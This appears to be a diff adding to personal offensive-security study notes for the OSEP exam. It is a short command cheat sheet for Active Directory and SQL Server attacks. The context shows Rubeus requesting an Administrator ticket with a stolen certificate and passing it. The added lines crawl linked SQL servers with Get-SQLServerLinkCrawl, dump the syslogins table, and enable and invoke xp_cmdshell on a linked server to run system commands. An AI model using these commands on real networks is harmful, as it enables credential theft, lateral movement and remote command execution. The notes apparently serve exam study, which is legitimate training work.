@@ -136,5 +136,20 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 .\Rubeus.exe asktgt /user:Administrator /domain:corp.local /certificate:cert.pfx /password:pass /ptt
 
 
+Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1
 
+Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query "select * from master..syslogins" | ft
+
+
+Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'" | ft
+
+
+https://github.com/NexKosh/OSEP-NOTE/blob/main/Microsoft%20SQL%20Attacks.md
+
+-- Example OSEP pattern to turn on shell execution remotely via the link
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [SQL06];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SQL06];
+
+-- Execute system commands on the linked server
+EXEC ('xp_cmdshell ''whoami'';') AT [SQL06];
 
